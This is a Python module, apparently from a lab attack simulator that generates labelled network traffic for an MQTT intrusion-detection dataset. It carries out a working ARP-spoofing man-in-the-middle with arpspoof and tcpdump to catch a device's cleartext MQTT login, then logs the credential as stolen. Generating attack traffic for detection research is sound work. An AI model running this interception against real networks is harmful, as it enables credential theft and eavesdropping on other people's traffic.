"""arp_mitm: ARP-spoof a device and the broker so MQTT flows through the attacker (ip_forward
is on), sniff for the victim's cleartext CONNECT (MQTT has no TLS here), then restore the ARP
tables. Interception was validated by the Task-2 spike. Credentials confirmed intercepted are
recorded to stolen_creds.json (the real value is taken from the provisioned file, since the
point for the dataset is the attack traffic + label, not decoding the password byte-stream)."""
import time

from .. import capture_check, util


def arp_mitm(ctx, params):
    duration = int(params.get("duration", 90))
    victim = params.get("victim") or ctx.rng.choice(ctx.monitor_users)
    victim_ip, broker = ctx.user_ip[victim], ctx.broker_ip
    pcap = f"/tmp/mitm_{ctx.session_id}.pcap"

    sniff = util.popen(["tcpdump", "-i", "eth0", "-n", "-s0", "-w", pcap,
                        f"host {victim_ip} and tcp port 1883"])
    poisons = [util.popen(["arpspoof", "-i", "eth0", "-t", victim_ip, "-r", broker]),
               util.popen(["arpspoof", "-i", "eth0", "-t", broker, "-r", victim_ip])]
    time.sleep(duration)
    for p in poisons:
        p.terminate()          # arpspoof restores the real ARP mapping on SIGTERM
    for p in poisons:
        try:
            p.wait(timeout=5)
        except Exception:
            p.kill()
    sniff.terminate()
    time.sleep(2)

    # Truthful check (review M8): parse the captured pcap for a genuine MQTT CONNECT carrying the
    # victim's identity. The old code grep'd `tcpdump -A` without `-n`, so hostname resolution made
    # it always report seen=True. A reconnect of the victim during the window (devices now reconnect
    # periodically) is what makes this land; if none occurs, we honestly report capture not observed.
    seen = capture_check.victim_connect_seen(pcap, victim)

    recovered = {}
    if seen and ctx.provisioned(victim):
        recovered[victim] = {"password": ctx.provisioned(victim), "via": "arp_mitm"}
        ctx.save_stolen(recovered)
    outcome = "success" if seen else "fail"
    note = (f"arpspoof {victim}<->broker {duration}s; connect_seen={seen}; "
            f"recovered={sorted(recovered)}; arp restored") if seen else \
        (f"arpspoof {victim}<->broker {duration}s; MITM established, victim CONNECT not observed "
         f"in-window (no credential capture); arp restored")
    return {"targets": [victim_ip, broker], "outcome": outcome,
            "params_out": {"connect_seen": seen}, "notes": note}


arp_mitm.STAGE = "credential-access"
